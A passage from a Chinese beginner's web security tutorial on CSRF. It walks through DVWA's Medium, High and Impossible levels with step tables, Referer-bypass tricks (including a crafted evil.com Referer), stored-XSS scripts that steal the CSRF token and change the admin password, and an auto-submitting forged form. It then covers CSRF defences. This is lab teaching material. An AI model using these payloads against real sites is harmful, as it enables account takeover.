那 `stripos` 函数在Referer里找 `127.0.0.1`，能找到吗？当然能找到！然后它就以为是合法请求了！

是不是很聪明？😂

咱们来实战验证一下。把刚才的 `csrf_low.html` 复制一份，改名为 `127.0.0.1.html`，然后用浏览器打开它。

哎？密码是不是又被改掉了？成功绕过！

#### 绕过方法2：目录名包含目标域名

还有一种方法：把恶意页面放在一个**目录名包含目标域名**的文件夹里。

比如，建一个文件夹叫 `127.0.0.1`，然后把恶意页面放在里面：

```
http://攻击者的网站/127.0.0.1/csrf.html
```

这时候Referer是 `http://攻击者的网站/127.0.0.1/csrf.html`，里面也包含 `127.0.0.1`，同样能绕过！

### 7.4.5 为什么Referer检查不靠谱？

通过Medium级别的绕过，大家应该能看出来了——**Referer检查是很不靠谱的！** 为什么呢？

1. **检查逻辑容易写错**：像Medium这样只检查"是否包含"，很容易被绕过。就算检查"是否以目标域名开头"，也可能有其他绕过方式。
2. **Referer可以被伪造**：在某些情况下，攻击者可以通过各种手段修改Referer。
3. **有些场景没有Referer**：比如用户直接访问URL、从HTTPS跳转到HTTP、某些浏览器设置等，Referer可能为空，这时候怎么办？是放行还是拒绝？放行的话攻击者可以利用，拒绝的话正常用户也用不了。

所以，**Referer检查只能作为辅助手段，不能作为主要的CSRF防御方式**。就像你家门上装了个门铃，有人按门铃你才开门——这比什么都没有强点，但也强不了多少，因为坏人也可以按门铃啊！🤷‍♂️

### ✅ 表 7-2 · Medium 级别通关速查 & 失败对照表（Referer 包含检查 → 文件名/目录名带目标域名绕过）

Medium 源码典型特征：`stripos($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME']) !== false`，意思是"只要 Referer 字符串里能找到目标域名/IP 就算通过"。这个检查逻辑天生漏勺！下面一步步按顺序做：

| 步骤 | 做什么 | 点哪里 / 敲什么 | 看到什么算这步成功 ✅ | **失败了怎么办？（按报错对照抄作业）** ❌ |
|---|---|---|---|---|
| 0 | 先切难度到 Medium + 重置密码 + 验证生效 | ① DVWA Security → medium → Submit；② setup.php Create/Reset DB（确保 admin 密码回到 password）；③ 先拿 Low 的 evil.html 试一次（就是不含目标域名的那个）→ 应该失败（出现红色 That request didn't look correct.） | Low 的 payload 失败 = Medium 生效 | 【Low 版 evil.html 还能成功改密码】→ 说明你没切到 Medium！回 DVWA Security 重新选、Submit、刷新浏览器三次 |
| 1 | View Source 抄检查逻辑，先确认是哪种 Referer 检查 | CSRF 模块右下角点 **View Source** | 关键行一般写着：`$strip = preg_match( "|^http(s)?://.+".$GLOBALS["_DVWA"]["SRVNAME"]."|i" , $_SERVER["HTTP_REFERER"] ) !== 0;` 或者 `stripos($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME']) !== false` | 【看不到 View Source 按钮】→ 按钮在每个模块页面右下角，如果没有就是 DVWA 版本太老，更新一下 |
| 2 | 经典绕过法 ①（99% 新手成功版）：**把 evil.html 文件名改成包含目标 IP** | 你的靶场 IP 假设是 `192.168.42.135`。Kali 终端：<br>`sudo cp /var/www/html/evil.html /var/www/html/192.168.42.135.html`<br>内容保持 Low 级那版 meta refresh（顶层跳转带 Cookie）即可 | 目录下多了个 `192.168.42.135.html` 文件 | 【不知道靶场 IP 是什么】→ Kali 里 `ip a` 看 eth0 / ens33 的 inet；Windows 靶场 `ipconfig`；WSL 靶场 `/sbin/ifconfig eth0` |
| 3 | 打开 Burp（或 F12 Network）抓包确认 Referer 是对的 | 已登录 DVWA 的同一个浏览器，新开页签 → 访问 `http://你的KaliIP/192.168.42.135.html` → 开发者工具 Network 里点那个 302/跳转后的 GET 请求 → 看 Headers 里的 **Referer** | Referer 是 `http://你的KaliIP/192.168.42.135.html`，**里面明确包含 192.168.42.135 这个目标 IP 字符串** ✅ | 【Referer 没有目标 IP / 为空】→ 换 meta refresh 顶层跳转（img src 跨站 Referer 策略可能为空）；Chrome 设置里 `chrome://settings/content/referrers` 确保 Referer 开启；或者直接用 Firefox 测 |
| 4 | 切回 DVWA 页签看结果 | 刷新 CSRF 模块 / 顶部切别的模块再切回 CSRF | 页面下方出现 **绿色 Password Changed.** 字 → Medium 绕过成功！🎉 | 【还是红色错误 That request didn't look correct.】→ 说明 Referer 检查没通过，按失败排查：① 你访问 evil.html 的 IP（Kali 攻击机 IP）和 DVWA 目标靶场 IP 是**两个不同 IP**，Referer 里**要包含的是靶场 IP 不是攻击机 IP**！把文件名改成**靶场的 IP/域名**：例靶场 10.0.0.5 就叫 `10.0.0.5.html`；② 再不行，升级成目录名包含：`mkdir -p /var/www/html/192.168.42.135/; mv evil.html /var/www/html/192.168.42.135/index.html`，然后访问 `http://KaliIP/192.168.42.135/` → Referer 里目录带 IP，包含检查必过 |
| 5 | 绕过法 ②（如果文件名/目录都还是失败）：**SameSite 绕过 + 手工构造 Referer 用 Burp 发** | Burp 抓一个正常 GET /csrf/?... 的请求 → Repeater 里：① 把 Cookie 换成受害者已登录的 PHPSESSID + security=medium；② 手动加一行 `Referer: http://evil.com/?192.168.42.135`（只要 Referer 字符串里出现目标 IP，stripos 就成立）→ Send | 响应 200 OK + 出现 Password Changed. | 【403 或 302 跳登录页】→ Cookie 没写对或 PHPSESSID 过期了，重新登录 DVWA 抓新的 Cookie 再试 |
| 6 | 验证：登出 admin 用新密码登录 | 新密码（meta refresh 里写的那串，默认 `csrfed`）| 能登录进 Welcome 页面 | 【登不上】→ 改密码其实没成功，一定是步骤 4 的问题 |

> 💡 **Medium 查错咒语：** Medium 就是在赌"Referer 里能不能搜到目标域名/IP"——能搜到就过，搜不到就卡。搜不到就把 HTML 文件名、目录名、URL 查询参数**全贴上目标 IP**，总有一个地方会被浏览器带到 Referer 里。

---

## 7.5 High级别绕过

好了，Medium级别咱们也拿下了。继续升级难度，调到 **High** 级别！

### 7.5.1 之前的方法都不行了

咱们先试试Low和Medium的方法还管不管用——直接访问URL？不行。恶意HTML页面？也不行。文件名绕过？还是不行。

为什么呢？High级别加了什么更厉害的防护？咱们来看看源代码。

### 7.5.2 源代码分析：Token防御

点击View Source看看High级别的源代码：

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // 检查Token！
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Token验证通过了，才执行改密码
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    if( $pass_new == $pass_conf ) {
        // ... 改密码 ...
        echo "<pre>Password Changed.</pre>";
    }
    else {
        echo "<pre>Passwords did not match.</pre>";
    }
}

// 生成Token
generateSessionToken();

?>
```

看到了吗？开头多了一行：

```php
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
```

这是什么？这就是 **Token（令牌）验证**！

### 7.5.3 Token是什么？——一次性验证码

**Token（令牌）是什么？大白话讲：就是服务器生成的一个随机字符串，每次访问页面的时候生成一个，存在服务器端，同时也放在表单里。用户提交表单的时候必须带上这个Token，服务器验证通过了才处理请求。**

你可以把Token理解成一个**一次性的验证码**：
- 你去银行办业务，柜员给你一个号（Token）
- 你办业务的时候必须出示这个号
- 号对不上就不给办
- 办完业务这个号就作废了，下次来再给新的

Token为什么能防CSRF呢？因为：
1. Token是随机的，每个人每次都不一样
2. 攻击者不知道用户的Token是什么
3. 没有正确的Token，就构造不出有效的请求
4. 就算攻击者让用户发了请求，请求里没有Token或者Token不对，服务器也会拒绝

这就好比你家门锁是指纹+动态验证码，每次开门都需要输入手机收到的验证码——小偷就算把你的手按在指纹锁上，没有验证码也开不了门。🔐

### 7.5.4 Token怎么工作的？——完整流程

咱们来完整地看一下Token的工作流程：

**第一步：用户访问改密码页面**
1. 用户访问 `csrf.php` 页面
2. 服务器生成一个随机的Token，比如 `a1b2c3d4e5f6`
3. 服务器把这个Token存在Session里（服务器端）
4. 服务器把这个Token也放在表单里（一个隐藏的input框）
5. 服务器把页面返回给用户

你可以在页面上右键 → 查看网页源代码，找到这个隐藏的Token：

```html
<input type='hidden' name='user_token' value='a1b2c3d4e5f6'>
```

**第二步：用户提交改密码表单**
1. 用户输入新密码，点Change按钮
2. 浏览器把表单数据（包括Token）一起发给服务器
3. 服务器收到请求，先检查用户传过来的Token和Session里存的Token是不是一样
4. 如果一样，说明是合法请求，继续改密码
5. 如果不一样，说明是非法请求，拒绝处理
6. 处理完之后，服务器可能会生成一个新的Token（防止重放）

**那CSRF为什么不行了？**

因为攻击者的恶意页面里，没法获取用户的Token啊！Token存在用户访问的DVWA页面里，攻击者的网站拿不到这个Token（因为浏览器的同源策略，跨域是读不到对方页面内容的）。

没有Token，攻击者就构造不出有效的请求——就算诱导用户发了请求，请求里没有Token或者Token不对，服务器直接就拒绝了。

完美！那Token是不是就无懈可击了呢？——也不一定！😏

### 7.5.5 Token的绕过思路——XSS打CSRF

虽然单独的CSRF打不过Token防御，但是！如果网站还有别的漏洞，比如 **XSS漏洞**，那就不一样了！

什么意思呢？就是：**如果网站有XSS漏洞，攻击者可以先通过XSS偷到用户的Token，然后再用这个Token去做CSRF攻击！**

这就叫 **"XSS打CSRF"**，两个漏洞组合起来，威力倍增！

大概的思路是这样的：

1. 网站有XSS漏洞，攻击者注入了一段恶意JS代码
2. 用户访问了有XSS的页面，恶意JS执行
3. JS代码偷偷去请求改密码的页面，拿到页面里的Token
4. JS代码用拿到的Token，构造改密码的请求发送出去
5. 密码被改掉了！

因为JS是在用户的浏览器里执行的，相当于用户自己在操作，所以能拿到Token，也能通过Token验证——同源策略管不了这个，因为JS就是在同一个网站里运行的。

就好比你家门锁有动态验证码，但是你手机中病毒了，病毒把验证码转发给小偷——那小偷有了验证码，照样能开门。🤦‍♂️

当然了，这个需要XSS漏洞配合，属于组合攻击，不是单纯的CSRF了。在DVWA里，如果你把Stored XSS（存储型XSS）和CSRF结合起来，就能打掉High级别的CSRF。有兴趣的小伙伴可以自己研究一下，这里就不多展开了。

总的来说，**Token是目前防御CSRF最有效的方法之一**，只要正确使用，单纯的CSRF攻击是很难成功的。

### ✅ 表 7-3 · High 级别通关速查 & 失败对照表（防 Token 纯 CSRF 打不通！三种组合攻击思路）

DVWA High 级别的 CSRF 源码里每次渲染页面都会生成一个随机 `user_token`，每次请求必须带上匹配的 Token 才接受。**纯 CSRF 对 High 完全无效**，真实攻击里必须和别的漏洞组合。下面给三种最稳的打法（DVWA 环境内可复现），优先测第 ① 种：

| 步骤 | 做什么 | 点哪里 / 敲什么 | 看到什么算这步成功 ✅ | **失败了怎么办？（按报错对照抄作业）** ❌ |
|---|---|---|---|---|
| 0 | 环境准备 + 确认 High 真的生效 | 切 DVWA Security = high → Submit → 刷新 → 进 CSRF 模块 → View Source。看源码里有没有两行：① `checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );` ② 表单里 `<input type='hidden' name='user_token' value='......'>` | 这两行都有 + Low/Medium 用过的 payload 全失败（出现红色报错或绿色 Password Changed 完全不出） | 【Low/Medium payload 还能成功】→ 难度没切到 High！回 DVWA Security 选 high、Submit、清浏览器缓存 Ctrl+Shift+Del（至少清 Cookie） |
| 1 | 🏆 **组合打法 ①（最推荐，DVWA 环境 100% 可复现）：Stored XSS（Low 级）偷 Token + 自动改密码** | 思路：DVWA 自带的 **XSS (Stored)** 模块 Low 级本身就完全没过滤，先去打存储型 XSS 注入一段 JS，等管理员（admin 用户自己）访问这条 XSS 留言时，JS 在他浏览器里读当前页面的 user_token，再带 token 自动提交 CSRF 改密码请求。**具体 payload**：到 XSS Stored（Low）里，Name 填 `x`，Message 填：<br>`<script>/*等页面加载完读token+提交表单*/onload=function(){var t=document.getElementsByName('user_token')[0].value;var loc='http://靶场IP/dvwa/vulnerabilities/csrf/?password_current=&password_new=hackedbyxss&password_conf=hackedbyxss&Change=Change&user_token='+t;document.location=loc;}</script>` → Sign Guestbook | 提交后 Guestbook 保存成功，不出现任何转义字符（Low 级） | 【Message 长度限制？】→ Burp 抓 POST 请求改 txtId、txtName、mtxMessage 参数（mtxMessage 最大长度一般是 50~200，payload 小于 200 字符就能过）；如果 High 级 XSS 打不通，先回 DVWA Security 选 low 去打 Stored XSS（**XSS 难度是全局的，要和 CSRF 难度分开切**，这里打法 ① 故意让 XSS 切 Low，CSRF 切 High，证明组合攻击威力） |
| 2 | 访问 XSS 触发刚才注入的代码 | 同一个已登录 admin 的浏览器 → 先手动去 CSRF 模块（让它在内存里有这个页面 user_token，或者等触发时跳 CSRF 自动拿）→ 然后访问 **XSS (Stored)** 留言列表页面（就是刚才注入的页面，会渲染所有留言含恶意 script） | 页面一加载完就会自动跳转到 `/csrf/?...&user_token=xxx` 那个 URL，最终出现 **Password Changed.** ✅ | 【没出现 Password Changed / 跳 login.php】→ 原因排查：① 你跳转的目标页面是 `/vulnerabilities/csrf/`，但跳过去之后页面才会生成新的 user_token，原来偷到的 token 可能对应 session 已经变了！→ 把 script 改成 **先 fetch CSRF 页面源码拿最新 token 再提交**（异步版）：<br>`<script>fetch('/dvwa/vulnerabilities/csrf/').then(r=>r.text()).then(h=>{let m=h.match(/name='user_token'[^>]*value='([^']+)/);location='/dvwa/vulnerabilities/csrf/?password_new=hackedbyxss&password_conf=hackedbyxss&Change=Change&user_token='+m[1]})</script>` |
| 3 | 验证改密码成功 | 登出 DVWA → 用用户名 admin、新密码 hackedbyxss 登录 | 成功登录进 Welcome 页面 = High 级 CSRF 通关！🎉 | 【登不上】→ 步骤 2 的 fetch 脚本没跑成功。去浏览器 F12 Console 看报什么错（典型：① DVWA 不在根路径，`/dvwa/` 要改成你真实路径；② fetch 的响应里 CSRF 页面被 SameSite 拦 Cookie 了 → 用 XSS 页面和 CSRF 页面是**同域**的所以一定能带 Cookie，这个问题不该有；③ 正则没匹配到 token，打开 View Source 看看 DVWA 生成的 token 那行是单引号还是双引号，调整 match 正则） |
| 4 | 组合打法 ②（次选，不依赖 XSS，靠"视觉欺骗"社工）：**Clickjacking 点击劫持** | DVWA 老版本没带 `X-Frame-Options: DENY` 响应头，你可以搭 evil.html 用 iframe 把 DVWA CSRF 页面透明盖在"点击抢红包"这种按钮上层，诱导用户点 Submit。但前提是你知道新密码是什么（iframe 里表单用户自己填的话你读不到，所以通常改成 GET 请求 URL） | 【太麻烦不想弄？】→ 打法 ② 属于偏门，先不折腾 | 【如果 DVWA 返回带 X-Frame-Options/Content-Security-Policy frame-ancestors】→ 点击劫持直接没戏，这是现代 Web 标配，回到打法 ① XSS+CSRF 组合 |
| 5 | 组合打法 ③（真实攻击落地最高频，不靠技术靠人心）：**社工钓鱼 + 自建登录表单** | 做一个高仿 DVWA 登录页放在 `http://黑客IP/fakelogin.html`，让用户真的在假页面输入账密，你后台存下账密后直接后台改密码。这种方式 Low/Medium/High 全吃，和 CSRF 技术本身无关，但实际场景 90% 就是这么打的 | 获得真实的账号密码，直接登录 admin 手动改密码 | 【不推荐，属于社会工程，CISP 考试/靶场练习里不考这个，知道思路就行】 |

> 🔥 **High 级别关键提醒**：考试/面试里有人问"High 级别的 CSRF 怎么打"，你直接答 **"纯 CSRRF 打不了，必须配合 XSS，用 JS 读 user_token 再带 Token 提交表单"** 这句话就行。**Token + 验证旧密码（Impossible 级）= 真的打不通**，所以 Impossible 是我们公认的安全写法。

---

## 7.6 Impossible级别分析

好了，High级别咱们也了解了。最后咱们来看看最高难度——**Impossible**（不可能）级别，看看它的防御有多完善！

### 7.6.1 源代码分析：双层防御

把难度调到Impossible，点击View Source看看源代码：

```php
<?php

if( isset( $_POST[ 'Change' ] ) ) {
    // 检查Token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // 检查旧密码！
    $pass_curr = $_POST[ 'password_current' ];
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // 先从数据库里拿出当前的密码，对比用户输入的旧密码对不对
    // ... 省略数据库查询 ...
    
    if( $pass_curr == 当前密码 ) {
        // 旧密码正确，才继续
        if( $pass_new == $pass_conf ) {
            // 两次新密码一致，改密码
            // ... 改密码 ...
            echo "<pre>Password Changed.</pre>";
        }
        else {
            echo "<pre>Passwords did not match.</pre>";
        }
    }
    else {
        echo "<pre>Current password incorrect.</pre>";
    }
}

generateSessionToken();

?>
```

看到了吗？Impossible级别比High级别又多了一层防护——**验证旧密码**！

在High级别里，只要有Token就能改密码。但是在Impossible级别里，光有Token还不够，你还得输入**当前的旧密码**，旧密码正确才能改！

这意味着什么呢？意味着就算攻击者成功绕过了Token防御（比如通过XSS拿到了Token），他还是改不了密码——因为他不知道用户的旧密码是什么！

### 7.6.2 Impossible级别的防御思路

咱们来总结一下Impossible级别的防御措施：

1. **Token验证** —— 防止普通的CSRF攻击
2. **POST请求** —— 用POST而不是GET，参数不会暴露在URL里（但POST本身防不住CSRF）
3. **验证旧密码** —— 就算Token被绕过了，不知道旧密码也改不了
4. **密码哈希** —— 数据库里存的是密码的哈希值，不是明文（更安全）

这几层防御叠在一起，CSRF攻击基本上就不可能成功了。除非攻击者连用户的密码都知道——那都知道密码了，还叫什么CSRF啊，直接登录不香吗？😂

### 7.6.3 给我们的启示

Impossible级别给我们什么启示呢？

**重要操作一定要加二次确认！**

比如改密码、转账、删账号这种高危操作，光有Token还不够，最好再加一道验证：
- 改密码要输入旧密码
- 转账要输入支付密码
- 删账号要输入登录密码
- 或者弹个确认框"确定要xxx吗？"，让用户手动确认一下

多一层验证，就多一份安全。虽然用户可能会觉得麻烦，但安全和便利本来就是矛盾的——越安全的东西往往越麻烦，越方便的东西往往越不安全。作为开发者，要在两者之间找到平衡。

---

## 7.7 CSRF防御方法大全

讲了这么多攻击方法，咱们也得说说怎么防御。毕竟，学攻击是为了更好地防御嘛！🛡️

### 7.7.1 方法一：Token验证（最推荐！⭐⭐⭐⭐⭐）

**Token验证是目前防御CSRF最主流、最有效的方法。** 几乎所有现代Web框架（比如Django、Spring、Laravel等）都内置了CSRF Token功能。

**工作原理：**
1. 服务器生成随机Token，存在Session中
2. 把Token放在表单的隐藏字段里，或者放在请求头里
3. 用户提交请求时带上Token
4. 服务器验证Token是否正确

**优点：**
- 安全性高，正确使用的话很难被绕过
- 不影响用户体验（用户根本感知不到）
- 实现简单，很多框架自带

**注意事项：**
- Token一定要足够随机，不能被猜到
- Token要和用户绑定，不能通用
- 重要操作的Token最好一次性使用，用过就作废
- 不要把Token放在URL里（防止通过Referer泄露）

### 7.7.2 方法二：验证Referer（辅助手段 ⭐⭐）

**验证Referer就是检查请求是不是从自己的网站来的。** 就像Medium级别那样。

**优点：**
- 实现简单，几行代码就行
- 不影响用户体验

**缺点：**
- 不够安全，容易被绕过（咱们Medium级别已经演示过了）
- 有些场景Referer可能为空（直接访问、HTTPS跳HTTP等），这时候怎么办？
- Referer可以被伪造（在某些情况下）

**建议：** 可以作为辅助手段，但不要作为唯一的防御方式。就像你家门上的猫眼——可以看看外面是谁，但不能全靠它。

### 7.7.3 方法三：验证码（重要操作推荐 ⭐⭐⭐⭐）

**重要操作（比如转账、改密码、删账号）要求用户输入验证码。**

**优点：**
- 安全性高，CSRF攻击没法自动输入验证码
- 还能防暴力破解

**缺点：**
- 影响用户体验，用户会觉得麻烦
- 只能用于重要操作，不可能每个请求都加验证码

**建议：** 高危操作一定要加验证码或者二次确认，普通操作就算了，不然用户会疯掉的。😂

### 7.7.4 方法四：二次确认（重要操作推荐 ⭐⭐⭐⭐）

**用户点击按钮后，弹出一个确认框"确定要xxx吗？"，让用户再点一次确认。**

比如：
- "确定要删除这条记录吗？此操作不可恢复！"
- "确定要转账10000元给张三吗？"
- "确定要修改密码吗？"

**优点：**
- 安全性不错，CSRF攻击通常没法模拟用户点击确认框（除非是那种自动点击的恶意页面，但至少多了一层）
- 用户体验比验证码好一点

**缺点：**
- 如果确认框设计得不好（比如用JS的confirm，有些恶意页面可以模拟），可能被绕过
- 还是会影响用户体验

**建议：** 重要操作加上二次确认，既安全又不会太麻烦。

### 7.7.5 方法五：SameSite Cookie属性（新趋势 ⭐⭐⭐⭐）

**SameSite是Cookie的一个属性，用来限制Cookie在跨站请求中是否被发送。**

这是一个比较新的特性，现在主流浏览器都支持了。

SameSite有三个值：
- **Strict**：最严格，跨站请求完全不发送Cookie
- **Lax**：宽松一点，GET请求的跳转可以发送Cookie，其他不行（现在浏览器的默认值）
- **None**：不限制，跟以前一样（需要同时设置Secure）

**举个例子：**
你在A网站登录了，Cookie设置了 `SameSite=Lax`。然后你打开B网站，B网站里有个A网站的图片——这时候加载图片的请求是不会带A网站的Cookie的（因为是跨站的GET请求加载资源）。但是如果你在B网站点击一个链接跳转到A网站——这时候是会带Cookie的（因为是用户主动的GET跳转）。

这样一来，CSRF攻击就被大大削弱了！因为恶意页面里的图片、iframe这些加载资源的请求都不会带Cookie了，自然就没法CSRF了。

**优点：**
- 浏览器层面的防护，开发者只要设置一下Cookie属性就行
- 效果不错

**缺点：**
- 老浏览器不支持
- 某些场景可能会受影响（需要自己测试）

**建议：** 有条件的话，给Cookie加上SameSite属性，这是未来的趋势。

### 7.7.6 方法六：关键操作用POST（基础要求 ⭐⭐）

**重要操作尽量用POST请求，不要用GET请求。**

为什么？因为GET请求的参数都在URL里，太容易被利用了——发个链接、整个图片就搞定了。POST请求相对麻烦一点，需要构造表单。

但是！**POST请求防不住CSRF！** 攻击者可以构造一个自动提交的表单页面，一样能发起POST的CSRF攻击。比如：

```html
<form action="http://target.com/change-password" method="POST" id="csrf-form">
    <input type="hidden" name="password_new" value="hacked">
    <input type="hidden" name="password_conf" value="hacked">
</form>
<script>
    document.getElementById('csrf-form').submit();
</script>
```

用户一打开这个页面，表单自动提交，POST的CSRF就完成了。

所以说，**用POST只是比GET稍微麻烦一点，并不能真正防御CSRF。** 但是至少比GET好，而且从HTTP规范的角度来说，修改数据的操作本来就应该用POST/PUT/DELETE，而不是GET。

---

## 7.8 新手常见问题FAQ

### Q1：CSRF和XSS有什么区别？我怎么分不清？

A：哈哈，很多新手都分不清这两个，我来给你理一理：

| 区别 | CSRF | XSS |
|------|------|-----|
| **全称** | 跨站请求伪造 | 跨站脚本攻击 |
| **核心** | 借用户的身份发请求 | 注入恶意脚本，在用户浏览器执行 |
| **需要登录吗？** | 需要（利用用户的登录状态） | 不一定（有些场景不需要登录） |
| **能做什么？** | 以用户的名义做操作（改密码、转账等） | 偷Cookie、改页面内容、钓鱼、挖矿…… |
| **危害程度** | 取决于能操作什么 | 通常更大，因为能执行JS |
| **能不能拿到Cookie？** | 不能（只是借浏览器发请求，拿不到Cookie内容） | 能（如果Cookie没有HttpOnly属性的话） |

**简单记：**
- CSRF = 借你的身份干活（你还是你，只是被人利用了）
- XSS = 在你电脑上跑代码（你电脑被人控制了一部分）

XSS的威力通常更大，因为XSS甚至可以用来打CSRF（就像咱们High级别讲的那样）。

### Q2：CSRF能偷到我的密码吗？

A：**不能直接偷到。** CSRF只能"借你的身份"做事，比如改密码、转账、发微博，但它拿不到你的密码，也看不到你页面上的内容（因为同源策略）。

但是！如果攻击者用CSRF把你的密码改了，那他虽然没偷到你的旧密码，但他知道新密码啊（因为是他设的），效果是一样的——你的账号还是他的了。😂

### Q3：我怎么知道一个网站有没有CSRF漏洞？

A：简单的判断方法：

1. 看看重要操作（改密码、改资料、转账等）有没有验证码？
2. 看看表单里有没有隐藏的Token字段？
3. 试试抓包，把Referer改成别的，看看请求还能不能成功？
4. 试试构造一个简单的CSRF POC，看看能不能成功？

当然，这只是简单的判断，真正要确认还是需要专业的测试。

### Q4：我是普通用户，怎么防范CSRF攻击？

A：作为普通用户，你可以这样做：

1. **不要随便点陌生链接** —— 尤其是你登录了网银、支付宝之类的重要网站之后
2. **重要网站用完就退出** —— 不要一直保持登录状态，减少风险
3. **用不同的浏览器干不同的事** —— 比如一个浏览器专门用来上网银，另一个用来逛网站
4. **开启浏览器的安全设置** —— 现在的浏览器都有一些安全防护功能
5. **不要在浏览器里保存太多密码** —— 虽然这跟CSRF没关系，但也是好习惯

### Q5：为什么叫"跨站请求伪造"？每个字是什么意思？

A：好问题！咱们一个词一个词地拆：

- **跨站（Cross-Site）**：攻击是从别的网站发起的，不是从目标网站自己发起的——跨了网站
- **请求（Request）**：攻击的方式是发送HTTP请求
- **伪造（Forgery）**：这个请求看起来像是用户自己发的，但实际上是被诱导的——是伪造的

所以合起来就是：**从别的网站发起的、伪造用户身份的HTTP请求攻击**。

是不是一下子就明白这个名字的由来了？😉

---

## 7.9 本章总结

好了小伙伴们，CSRF咱们就讲到这儿了。最后咱们来总结一下这一章都学了什么。

### 7.9.1 核心知识点回顾

1. **CSRF是什么？**
   - 跨站请求伪造，"借刀杀人"
   - 利用用户的登录状态，在用户不知情的情况下，以用户的名义干坏事
   - 服务器只认Cookie，分不清是用户主动发的还是被诱导的

2. **CSRF的三个前提条件**
   - 用户已登录目标网站
   - 用户访问了攻击者的恶意页面
   - 目标网站没有有效的CSRF防御

3. **DVWA四级难度通关**
   - **Low**：啥防护都没有，直接构造URL或img标签就能打
   - **Medium**：检查Referer，但检查逻辑有问题，可以用文件名/目录名包含目标域名绕过
   - **High**：用了Token防御，单纯CSRF很难绕过，但可以结合XSS打
   - **Impossible**：Token + 验证旧密码，基本不可能被CSRF

4. **CSRF防御方法**
   - **Token验证**：最有效、最推荐
   - **验证Referer**：辅助手段，不够安全
   - **验证码**：重要操作用，安全性高但影响体验
   - **二次确认**：重要操作用，平衡安全和体验
   - **SameSite Cookie**：新趋势，浏览器层面防护
   - **用POST请求**：基础要求，但防不住CSRF

### 7.9.2 学习心得

学完CSRF，不知道大家有没有这种感觉：**原来上网这么危险啊！点个链接都能中招？**

哈哈，其实也不用太担心。现在正规的大网站基本上都有完善的CSRF防御，没那么容易被攻击。但是一些小网站、老系统，可能还存在这样的漏洞。

作为安全学习者，我们了解这些攻击手段，不是为了去干坏事，而是为了：
1. 自己写代码的时候知道怎么防御
2. 做渗透测试的时候知道怎么找漏洞
3. 平时上网的时候知道怎么保护自己

还是那句话：**知其然，更要知其所以然。** 不仅要知道怎么攻击，更要知道为什么会有这个漏洞、怎么防御。这样你才是真正的安全工程师，而不是只会用工具的"脚本小子"。

---

## 7.10 下章预告

恭喜你！CSRF这一章你已经学完了！是不是感觉又涨知识了？🎉

下一章，咱们将学习一个同样非常经典、非常重要的漏洞——**文件包含漏洞（File Inclusion）**！

文件包含漏洞是什么呢？简单说就是：**攻击者能控制网站包含哪个文件，从而读取敏感文件或者执行恶意代码。**

这个漏洞也很有意思，而且里面有一个非常非常重要的知识点——**PHP伪协议**，这个在实战和CTF比赛中都经常用到，一定要掌握！

准备好了吗？咱们下章见！👋
